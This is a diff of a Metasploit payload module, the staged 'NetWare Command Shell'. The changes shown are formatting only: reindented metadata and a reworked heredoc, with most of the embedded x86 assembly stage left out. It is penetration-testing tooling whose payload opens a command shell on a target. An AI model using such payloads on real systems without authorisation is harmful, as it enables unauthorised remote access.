@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -9,29 +10,28 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'NetWare Command Shell',
-      'Description'   => 'Connect to the NetWare console (staged)',
-      'Author'        => 'toto',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'netware',
-      'Arch'          => ARCH_X86,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadCompat' =>
-        {
-          'Convention' => 'sockesi'
-        },
-      'Stage'         =>
-        {
-          'Offsets' =>
-            {
-              #'EXITFUNC' => [ 443, 'V' ]
-            },
-          'Assembly' => <<EOS
+                     'Name'          => 'NetWare Command Shell',
+                     'Description'   => 'Connect to the NetWare console (staged)',
+                     'Author'        => 'toto',
+                     'License'       => MSF_LICENSE,
+                     'Platform'      => 'netware',
+                     'Arch'          => ARCH_X86,
+                     'Session'       => Msf::Sessions::CommandShell,
+                     'PayloadCompat' =>
+                       {
+                         'Convention' => 'sockesi'
+                       },
+                     'Stage'         =>
+                       {
+                         'Offsets' =>
+                           {
+                             # 'EXITFUNC' => [ 443, 'V' ]
+                           },
+                         'Assembly' => <<EOS
 jmp main_code
 ;;;
 ; resolve a symbol address using the DebuggerSymbolHashTable
@@ -463,10 +463,10 @@ screen_info:
   dd 0            ; screen checksum
   dd 0            ; screen state
 end_reverse:
-  nop
-EOS
-        }
-      ))
+                 nop
+               EOS
+                       }
+                    ))
   end
 
   def size
